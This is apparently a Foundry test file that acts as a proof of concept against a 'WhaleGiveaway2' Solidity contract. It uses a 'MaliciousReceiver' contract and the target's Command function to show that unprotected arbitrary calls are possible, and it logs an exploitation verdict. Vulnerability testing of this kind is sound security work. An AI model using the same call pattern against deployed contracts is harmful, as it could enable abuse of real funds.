// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2.sol";

contract MaliciousReceiver {
    uint256 public stateChangeCounter;
    
    // Fallback function performs state change (costs >2300 gas)
    fallback() external payable {
        stateChangeCounter++; // Costs ~20,000 gas, impossible with transfer()
    }
}

contract WhaleGiveaway2Test is Test {
    WhaleGiveaway2 public whaleContract;
    MaliciousReceiver public maliciousContract;
    address owner = makeAddr("testOwner");

    function setUp() public {
        // Deploy contracts - test contract becomes owner by default
        whaleContract = new WhaleGiveaway2();
        maliciousContract = new MaliciousReceiver();
        
        // Fund test contract
        vm.deal(address(this), 1 ether);
    }

    function test_UnprotectedCallAllowsArbitraryExecution() public {
        console.log("--- BEFORE-Trigger stateChangeCounter ---");
        uint256 initialCounter = maliciousContract.stateChangeCounter();
        console.log("StateChangeCounter BEFORE attack:", initialCounter);
        assertEq(initialCounter, 0, "Counter should start at 0");
        
        // Prepare empty data
        bytes memory emptyData = "";
        
        console.log("--- Trigger CommandCall ---");
        whaleContract.Command{value: 0.1 ether}(
            address(maliciousContract),
            emptyData
        );
        
        console.log("--- AFTER-Trigger stateChangeCounter ---");
        uint256 finalCounter = maliciousContract.stateChangeCounter();
        console.log("StateChangeCounter AFTER attack:", finalCounter);
        
        // Verify state changed and log verdict
        bool vulnerabilityExists = (finalCounter != initialCounter);
        console.log(
            "Vulnerability verdict:", 
            vulnerabilityExists ? 
                "SUCCESSFUL EXPLOITATION (state increased by 1)" : 
                "UNSUCCESSFUL EXPLOITATION (no state change)"
        );
        
        // Final vulnerability existence verdict
        if (vulnerabilityExists) {
            console.log("---");
            console.log("Vulnerability Exists: Malicious contract's state was modified, proving arbitrary code execution was possible");
        } else {
            console.log("---");
            console.log("Vulnerability not Exist: Malicious contract's state remained unchanged, indicating safe call protections");
        }
    }
}